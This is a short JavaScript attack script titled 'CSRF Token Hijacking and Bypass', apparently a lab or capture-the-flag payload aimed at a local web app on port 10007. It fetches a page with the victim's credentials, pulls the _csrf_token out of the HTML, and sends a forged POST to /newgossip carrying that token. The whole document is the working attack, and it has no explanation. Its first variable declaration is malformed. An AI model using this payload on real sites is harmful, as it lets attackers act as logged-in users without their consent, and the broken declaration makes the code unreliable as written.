// === CSRF Token Hijacking and Bypass === //

// request recon
var = domain "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.withCredentials = true;
req1.send();

// request process
var response = req1.responseText;

// request parse 
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');

// CSRF token extract
var token = doc.getElementsByName("_csrf_token")[0].value;

// payload
var req2 = new XMLHttpRequest();
var data = "title=prueba&subtitle=prueba&text=prueba&_csrf_token=" + token;
req2.open('POST', 'http://localhost:10007/newgossip', false);
req2.withCredentials = true;

// headers
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

// send
req2.send(data);

